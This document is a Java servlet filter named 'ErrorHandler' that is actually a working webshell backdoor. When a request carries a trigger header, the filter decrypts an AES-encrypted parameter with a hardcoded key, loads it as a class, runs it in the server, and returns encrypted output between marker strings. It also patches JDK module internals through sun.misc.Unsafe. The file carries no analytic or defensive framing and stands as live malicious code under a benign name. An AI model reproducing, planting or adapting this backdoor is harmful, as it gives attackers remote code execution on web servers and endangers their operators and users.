import jakarta.servlet.Filter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class ErrorHandler extends ClassLoader implements Filter {
    public String key = "7b74f5d44e20fd71";
    public String pass = "passFilter";
    public String md5 = "6DA9A394180B0155C7CC6714A0B2179E";
    public String headerName = "User-Agent";
    public String headerValue = "test";
    public static boolean isBypassModule;

    public ErrorHandler() {
    }

    public ErrorHandler(ClassLoader var1) {
        super(var1);
    }

    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(this.key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var41) {
            return null;
        }
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(this.pass));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new ErrorHandler(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();

                    Object f;
                    try {
                        f = ((Class)session.getAttribute("payload")).newInstance();
                    } catch (IllegalAccessException | InstantiationException e) {
                        throw new RuntimeException(e);
                    }

                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(this.md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(this.md5.substring(16));
                }
            } else {
                chain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception var12) {
            chain.doFilter(servletRequest, servletResponse);
        }

    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String)encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) {
        byte[] value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static Object byPassJdkModule() {
        Boolean var0 = false;

        try {
            Class var1 = Class.forName("sun.misc.Unsafe");
            Field var2 = var1.getDeclaredField("theUnsafe");
            var2.setAccessible(true);
            Object var3 = var2.get((Object)null);
            Method var4 = Class.class.getMethod("getModule");
            Object var5 = var4.invoke(Object.class, (Object[])null);
            Method var6 = var3.getClass().getMethod("objectFieldOffset", Field.class);
            Field var7 = Class.class.getDeclaredField("module");
            Long var8 = (Long)var6.invoke(var3, var7);
            Method var9 = var3.getClass().getMethod("getAndSetObject", Object.class, Long.TYPE, Object.class);
            var9.invoke(var3, ErrorHandler.class, var8, var5);
            var0 = true;
        } catch (Exception var10) {
        }

        return var0;
    }

    static {
        byPassJdkModule();
    }
}
